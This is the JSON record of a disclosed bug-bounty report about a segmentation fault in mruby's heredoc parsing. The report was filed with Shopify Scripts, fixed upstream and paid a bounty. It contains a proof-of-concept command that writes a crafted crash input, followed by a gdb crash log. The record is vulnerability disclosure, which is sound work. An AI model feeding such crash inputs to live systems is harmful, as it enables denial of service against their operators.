{"id":297383,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTczODM=","url":"https://hackerone.com/reports/297383","title":"mruby heredoc notation","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-12-12T23:32:33.925Z","submitted_at":"2017-12-12T23:32:33.925Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"j0s3","url":"/j0s3","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-01-10T23:46:42.876Z","bug_reporter_agreed_on_going_public_at":"2018-01-10T23:46:42.412Z","team_member_agreed_on_going_public_at":"2017-12-18T22:45:08.033Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi\nThere exists a vulnerability in mruby when using the heredoc notation (it doesn't need ulimit)\n\nThe minified test can be generated with the following command:\n```\nruby -e 'IO.binwrite(\"j_3_.rb\", \"\\xa7\u003cl while\\x270\\x27\u003e\u003c\u003ci\\x00\" + (\"\\x0a\" * 0x3ffd) + \"i\\x0a\")'\n```\n\nlog:\n```\nroot@Ubuntu-1604-xenial-64-minimal ~/jtest/mruby/bin # ulimit -Sv unlimited; ruby -e 'IO.binwrite(\"j_3_.rb\", \"\\xa7\u003cl while\\x270\\x27\u003e\u003c\u003ci\\x00\" + (\"\\x0a\" * 0x3ffd) + \"i\\x0a\")'; rm core; ulimit -c unlimited; ./mruby j_3_.rb; gdb ./mruby core\nSegmentation fault (core dumped)\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u003chttp://gnu.org/licenses/gpl.html\u003e\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n\u003chttp://www.gnu.org/software/gdb/bugs/\u003e.\nFind the GDB manual and other documentation resources online at:\n\u003chttp://www.gnu.org/software/gdb/documentation/\u003e.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./mruby...done.\n[New LWP 32567]\nCore was generated by `./mruby j_3_.rb'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x000000000041c7c2 in mrb_vm_exec (mrb=0xae2010, proc=0xd66440, pc=0x7ff884d18014)\n    at /root/jtest/mruby/src/vm.c:1231\n1231            JUMP;\n(gdb) x/5i $rip\n=\u003e 0x41c7c2 \u003cmrb_vm_exec+4535\u003e: mov    (%rax),%eax\n   0x41c7c4 \u003cmrb_vm_exec+4537\u003e: mov    %eax,-0x8e0(%rbp)\n   0x41c7ca \u003cmrb_vm_exec+4543\u003e: mov    -0x8e0(%rbp),%eax\n   0x41c7d0 \u003cmrb_vm_exec+4549\u003e: and    $0x7f,%eax\n   0x41c7d3 \u003cmrb_vm_exec+4552\u003e: cltq\n(gdb) i r\nrax            0x7ff884d18014   140705356939284\nrbx            0x0      0\nrcx            0xaf7810 11499536\nrdx            0x10     16\nrsi            0x3      3\nrdi            0xae2010 11411472\nrbp            0x7ffcbd6af3b0   0x7ffcbd6af3b0\nrsp            0x7ffcbd6aeaa0   0x7ffcbd6aeaa0\nr8             0x414829 4278313\nr9             0x42f0fd 4387069\nr10            0x7ff884817b78   140705351695224\nr11            0x2e08   11784\nr12            0x4019c0 4200896\nr13            0x7ffcbd6af7e0   140723486390240\nr14            0x0      0\nr15            0x0      0\nrip            0x41c7c2 0x41c7c2 \u003cmrb_vm_exec+4535\u003e\neflags         0x10206  [ PF IF RF ]\ncs             0x33     51\nss             0x2b     43\nds             0x0      0\nes             0x0      0\nfs             0x0      0\ngs             0x0      0\n\n```\n\nThanks\n\n## Impact\n\nDoS","vulnerability_information_html":"\u003cp\u003eHi\u003cbr\u003e\nThere exists a vulnerability in mruby when using the heredoc notation (it doesn\u0026#39;t need ulimit)\u003c/p\u003e\n\n\u003cp\u003eThe minified test can be generated with the following command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eruby -e \u0026#39;IO.binwrite(\u0026quot;j_3_.rb\u0026quot;, \u0026quot;\\xa7\u0026lt;l while\\x270\\x27\u0026gt;\u0026lt;\u0026lt;i\\x00\u0026quot; + (\u0026quot;\\x0a\u0026quot; * 0x3ffd) + \u0026quot;i\\x0a\u0026quot;)\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003elog:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@Ubuntu-1604-xenial-64-minimal ~/jtest/mruby/bin # ulimit -Sv unlimited; ruby -e \u0026#39;IO.binwrite(\u0026quot;j_3_.rb\u0026quot;, \u0026quot;\\xa7\u0026lt;l while\\x270\\x27\u0026gt;\u0026lt;\u0026lt;i\\x00\u0026quot; + (\u0026quot;\\x0a\u0026quot; * 0x3ffd) + \u0026quot;i\\x0a\u0026quot;)\u0026#39;; rm core; ulimit -c unlimited; ./mruby j_3_.rb; gdb ./mruby core\nSegmentation fault (core dumped)\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt;\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \u0026quot;show copying\u0026quot;\nand \u0026quot;show warranty\u0026quot; for details.\nThis GDB was configured as \u0026quot;x86_64-linux-gnu\u0026quot;.\nType \u0026quot;show configuration\u0026quot; for configuration details.\nFor bug reporting instructions, please see:\n\u0026lt;http://www.gnu.org/software/gdb/bugs/\u0026gt;.\nFind the GDB manual and other documentation resources online at:\n\u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;.\nFor help, type \u0026quot;help\u0026quot;.\nType \u0026quot;apropos word\u0026quot; to search for commands related to \u0026quot;word\u0026quot;...\nReading symbols from ./mruby...done.\n[New LWP 32567]\nCore was generated by `./mruby j_3_.rb\u0026#39;.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x000000000041c7c2 in mrb_vm_exec (mrb=0xae2010, proc=0xd66440, pc=0x7ff884d18014)\n    at /root/jtest/mruby/src/vm.c:1231\n1231            JUMP;\n(gdb) x/5i $rip\n=\u0026gt; 0x41c7c2 \u0026lt;mrb_vm_exec+4535\u0026gt;: mov    (%rax),%eax\n   0x41c7c4 \u0026lt;mrb_vm_exec+4537\u0026gt;: mov    %eax,-0x8e0(%rbp)\n   0x41c7ca \u0026lt;mrb_vm_exec+4543\u0026gt;: mov    -0x8e0(%rbp),%eax\n   0x41c7d0 \u0026lt;mrb_vm_exec+4549\u0026gt;: and    $0x7f,%eax\n   0x41c7d3 \u0026lt;mrb_vm_exec+4552\u0026gt;: cltq\n(gdb) i r\nrax            0x7ff884d18014   140705356939284\nrbx            0x0      0\nrcx            0xaf7810 11499536\nrdx            0x10     16\nrsi            0x3      3\nrdi            0xae2010 11411472\nrbp            0x7ffcbd6af3b0   0x7ffcbd6af3b0\nrsp            0x7ffcbd6aeaa0   0x7ffcbd6aeaa0\nr8             0x414829 4278313\nr9             0x42f0fd 4387069\nr10            0x7ff884817b78   140705351695224\nr11            0x2e08   11784\nr12            0x4019c0 4200896\nr13            0x7ffcbd6af7e0   140723486390240\nr14            0x0      0\nr15            0x0      0\nrip            0x41c7c2 0x41c7c2 \u0026lt;mrb_vm_exec+4535\u0026gt;\neflags         0x10206  [ PF IF RF ]\ncs             0x33     51\nss             0x2b     43\nds             0x0      0\nes             0x0      0\nfs             0x0      0\ngs             0x0      0\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThanks\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDoS\u003c/p\u003e\n","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-01-17T22:45:08.163Z","allow_singular_disclosure_after":-92990548.53181092,"singular_disclosure_allowed":true,"vote_count":4,"voters":["bl4de","eveeez","cr4xerbik4sh","japz"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2218734,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to two weeks to respond. Thank you for your patience!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eDue to the large volume of reports we have received, it may take us up to two weeks to respond. Thank you for your patience!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-12-12T23:32:34.238Z","updated_at":"2017-12-12T23:32:34.238Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2221912,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We have reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3900.","markdown_message":"\u003cp\u003eThank you for your report. We have reproduced the crash and opened an issue upstream: \u003ca title=\"https://github.com/mruby/mruby/issues/3900\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3900\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3900\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-14T07:20:36.421Z","updated_at":"2017-12-14T07:20:36.421Z","actor":{"username":"kristinaelise","cleared":false,"url":"/kristinaelise","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/227/aa2680ab69f8efa9766fd8f981b2587490c5a201_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2226032,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for your report. This was resolved upstream with the following commit: https://github.com/mruby/mruby/commit/05129ab9b3934ebc26a11f28d7d995793ea8baa5. \n\nDue to the holiday period, our next round of bounty decisions may be delayed until the second week of January. We'll be in touch with you again by then, if not sooner.","markdown_message":"\u003cp\u003eThank you again for your report. This was resolved upstream with the following commit: \u003ca title=\"https://github.com/mruby/mruby/commit/05129ab9b3934ebc26a11f28d7d995793ea8baa5\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F05129ab9b3934ebc26a11f28d7d995793ea8baa5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/05129ab9b3934ebc26a11f28d7d995793ea8baa5\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. \u003c/p\u003e\n\n\u003cp\u003eDue to the holiday period, our next round of bounty decisions may be delayed until the second week of January. We\u0026#39;ll be in touch with you again by then, if not sooner.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-15T16:37:14.888Z","updated_at":"2017-12-15T16:37:14.888Z","actor":{"username":"kristinaelise","cleared":false,"url":"/kristinaelise","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/227/aa2680ab69f8efa9766fd8f981b2587490c5a201_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"j0s3","url":"/j0s3"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2233087,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of MRuby and Shopify Scripts!","markdown_message":"\u003cp\u003eThanks for helping improve the security of MRuby and Shopify Scripts!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-18T22:44:58.553Z","updated_at":"2017-12-18T22:44:58.553Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"j0s3","url":"/j0s3"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2233088,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-18T22:45:08.084Z","updated_at":"2017-12-18T22:45:08.084Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2233119,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot :)","markdown_message":"\u003cp\u003eThanks a lot :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-18T22:53:28.986Z","updated_at":"2017-12-18T22:53:28.986Z","actor":{"username":"j0s3","cleared":false,"url":"/j0s3","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2276221,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-10T23:46:42.469Z","updated_at":"2018-01-10T23:46:42.469Z","actor":{"username":"j0s3","cleared":false,"url":"/j0s3","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2276222,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-10T23:46:42.917Z","updated_at":"2018-01-10T23:46:42.917Z","actor":{"username":"j0s3","cleared":false,"url":"/j0s3","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}